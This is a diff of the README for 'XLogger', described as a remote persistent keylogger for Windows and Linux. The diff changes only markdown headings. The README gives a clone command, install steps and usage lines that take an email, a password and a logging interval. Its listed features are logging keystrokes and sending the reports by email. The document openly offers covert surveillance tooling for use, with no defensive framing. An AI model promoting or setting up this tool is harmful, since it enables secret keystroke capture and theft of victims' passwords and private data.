@@ -2,23 +2,23 @@
 Remote persistent keylogger for Windows and Linux.
 
 
--Command :
+## Commands :
 
--Download
--git clone https://github.com/XPR1M3/XLogger.git
+### Download
+git clone https://github.com/XPR1M3/XLogger.git
 
--Installation
+### Installation
 -chmod +x install.sh
 -./ install.sh
 
--Usage
+### Usage
 -Execute - python xlogger.py
 -For help - python xlogger.py -h
 -For Windows - python xlogger.py -i [time count in second] -w -e [Email] -p [password] -o [file name]
 -For Linux - python xlogger.py -i [time count in second] -w -e [Email] -p [password] -o [file name]
 
 
--Features:
+### Features:
 
 -Logs keys pressed on keyboard.
 -Sends reports by email.
